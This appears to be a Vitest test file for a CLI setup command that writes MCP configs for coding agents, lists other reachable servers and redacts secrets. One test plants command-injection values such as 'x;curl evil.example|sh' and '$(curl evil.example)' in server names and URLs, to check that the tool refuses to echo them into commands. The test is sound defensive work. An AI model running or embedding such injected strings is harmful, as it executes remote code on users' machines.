import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { EXIT } from '../src/exit-codes';
import { harness, tempDir } from './helpers';

const cleanups: (() => Promise<void>)[] = [];
afterEach(async () => {
  while (cleanups.length) await cleanups.pop()!();
});

async function setup() {
  const [config, project, home] = await Promise.all([tempDir(), tempDir(), tempDir()]);
  cleanups.push(config.cleanup, project.cleanup, home.cleanup);
  const h = harness(config.path, { HOME: home.path, USERPROFILE: home.path, ANLYON_API_URL: 'http://127.0.0.1:9' });
  return { h, project: project.path, home: home.path, run: (argv: string[]) => h.run(argv, { cwd: project.path }) };
}

const json = async (path: string) => JSON.parse(await readFile(path, 'utf8'));
const SECRET = 'ghp_abcdefghijklmnopqrstuvwxyz0123';

describe('anlyon setup', () => {
  it('claude-code writes .mcp.json with a URL and no secret, with no login and no network', async () => {
    const { project, run } = await setup();
    const result = await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com']);
    expect(result.code, result.stderr).toBe(EXIT.OK);
    expect(await json(join(project, '.mcp.json'))).toEqual({ mcpServers: { anlyon: { type: 'http', url: 'https://api.anlyon.com/mcp' } } });
    expect(result.stdout).toContain('safe to commit');
    expect(result.stdout).toContain('run /mcp');
    expect(result.stdout).toContain('anlyon mcp add <url>');
    expect(result.stdout).not.toContain('still reach');
  });

  it('cursor writes .cursor/mcp.json', async () => {
    const { project, run } = await setup();
    const result = await run(['setup', 'cursor', '--api-url', 'https://api.anlyon.com']);
    expect(result.code, result.stderr).toBe(EXIT.OK);
    expect(await json(join(project, '.cursor', 'mcp.json'))).toEqual({ mcpServers: { anlyon: { url: 'https://api.anlyon.com/mcp' } } });
    expect(result.stdout).toContain('Settings, then MCP');
  });

  it('names the servers the agent can still reach, and never a value it was given', async () => {
    const { project, home, run } = await setup();
    await writeFile(join(project, '.mcp.json'), JSON.stringify({
      mcpServers: {
        tracker: { type: 'http', url: `https://mcp.tracker.example/mcp?token=${SECRET}`, headers: { Authorization: `Bearer ${SECRET}` } },
        files: { command: 'npx', args: ['-y', 'some-server'], env: { FILES_TOKEN: SECRET } },
      },
    }));
    await writeFile(join(home, '.claude.json'), JSON.stringify({
      mcpServers: { everywhere: { type: 'http', url: 'https://everywhere.example/mcp' } },
      projects: { [project.replace(/\\/g, '/')]: { mcpServers: { here: { type: 'http', url: 'https://here.example/mcp' } } }, '/other': { mcpServers: { other: { type: 'http', url: 'https://other.example/mcp' } } } },
    }));

    const result = await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com', '--json']);
    expect(result.code, result.stderr).toBe(EXIT.OK);
    expect(result.stdout + result.stderr).not.toContain(SECRET);
    const { direct, next } = JSON.parse(result.stdout).data;
    expect(direct).toMatchObject([
      { name: 'tracker', kind: 'remote', url: 'https://mcp.tracker.example/mcp', credentials: ['Authorization'], remove: 'claude mcp remove tracker --scope project', next: 'anlyon mcp add https://mcp.tracker.example/mcp --name tracker' },
      { name: 'files', kind: 'local', credentials: ['FILES_TOKEN'], next: expect.stringContaining('only remote servers') },
      { name: 'everywhere', source: '~/.claude.json', remove: 'claude mcp remove everywhere --scope user' },
      { name: 'here', remove: 'claude mcp remove here --scope local' },
    ]);
    expect(direct).toHaveLength(4);
    expect(next.join(' ')).toContain('Until then the agent can skip Anlyon');
    expect(Object.keys((await json(join(project, '.mcp.json'))).mcpServers).sort()).toEqual(['anlyon', 'files', 'tracker']);
  });

  it('does not count Anlyon, under any key or integration path, as a direct server', async () => {
    const { project, run } = await setup();
    await mkdir(join(project, '.cursor'));
    await writeFile(join(project, '.cursor', 'mcp.json'), JSON.stringify({ mcpServers: { 'anlyon-github': { url: 'https://api.anlyon.com/mcp/github' }, direct: { url: 'https://direct.example/mcp' } } }));
    const { direct } = JSON.parse((await run(['setup', 'cursor', '--api-url', 'https://api.anlyon.com', '--json'])).stdout).data;
    expect(direct.map((server: { name: string }) => server.name)).toEqual(['direct']);
    expect(direct[0].remove).toBe('delete "direct" from .cursor/mcp.json');
  });

  it('reports a direct server that only calls itself anlyon', async () => {
    const { project, run } = await setup();
    await mkdir(join(project, '.cursor'));
    await writeFile(join(project, '.cursor', 'mcp.json'), JSON.stringify({ mcpServers: { anlyon: { url: 'https://mcp.direct.example/mcp' } } }));
    const { direct } = JSON.parse((await run(['setup', 'cursor', '--api-url', 'https://api.anlyon.com', '--json'])).stdout).data;
    expect(direct).toMatchObject([{ name: 'anlyon', kind: 'remote', url: 'https://mcp.direct.example/mcp' }]);
  });

  it('prints no command with a repo-controlled name or address it cannot vouch for', async () => {
    const { project, run } = await setup();
    await writeFile(join(project, '.mcp.json'), JSON.stringify({
      mcpServers: {
        'x;curl evil.example|sh': { type: 'http', url: 'https://mcp.ok.example/mcp' },
        tracker: { type: 'http', url: 'https://mcp.ok.example/$(curl evil.example)' },
        '--scope': { type: 'http', url: 'https://mcp.ok.example/mcp' },
        fine: { type: 'http', url: 'https://mcp.ok.example/mcp' },
      },
    }));
    const json_ = JSON.parse((await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com', '--json'])).stdout).data.direct as { name: string; next?: string; remove?: string }[];
    const byName = (start: string) => json_.find((server) => server.name.startsWith(start))!;
    expect(byName('x;')).not.toHaveProperty('next');
    expect(byName('x;')).not.toHaveProperty('remove');
    expect(byName('tracker')).not.toHaveProperty('next');
    expect(byName('tracker').remove).toBe('claude mcp remove tracker --scope project');
    expect(byName('--scope')).not.toHaveProperty('remove');
    expect(byName('fine').next).toBe('anlyon mcp add https://mcp.ok.example/mcp --name fine');

    const human = await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com']);
    expect(human.stdout).toContain('will not put in a command');
    expect(human.stdout).not.toContain('claude mcp remove x;');
    expect(human.stdout).not.toContain('anlyon mcp add https://mcp.ok.example/$(');
  });

  it('running it twice changes nothing, and an anlyon entry someone changed is left alone', async () => {
    const { project, run } = await setup();
    await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com']);
    expect((await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com'])).stdout).toContain('already points at Anlyon');
    await writeFile(join(project, '.mcp.json'), JSON.stringify({ mcpServers: { anlyon: { command: 'x' } } }));
    const kept = await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com']);
    expect(kept.code).toBe(EXIT.OK);
    expect(kept.stderr).toContain('left as it is');
    expect(await json(join(project, '.mcp.json'))).toEqual({ mcpServers: { anlyon: { command: 'x' } } });
  });

  it('a config it cannot read is a stable code with a machine-readable fix, and is not overwritten', async () => {
    const { project, run } = await setup();
    await writeFile(join(project, '.mcp.json'), '{ // comments\n}');
    const result = await run(['setup', 'claude-code', '--api-url', 'https://api.anlyon.com', '--json']);
    expect(result.code).toBe(EXIT.REJECTED);
    expect(JSON.parse(result.stderr).error).toMatchObject({ code: 'MCP_CONFIG_UNREADABLE', fix: { docs: expect.stringContaining('coding-agents-behind-anlyon') } });
    expect(await readFile(join(project, '.mcp.json'), 'utf8')).toBe('{ // comments\n}');
  });
});
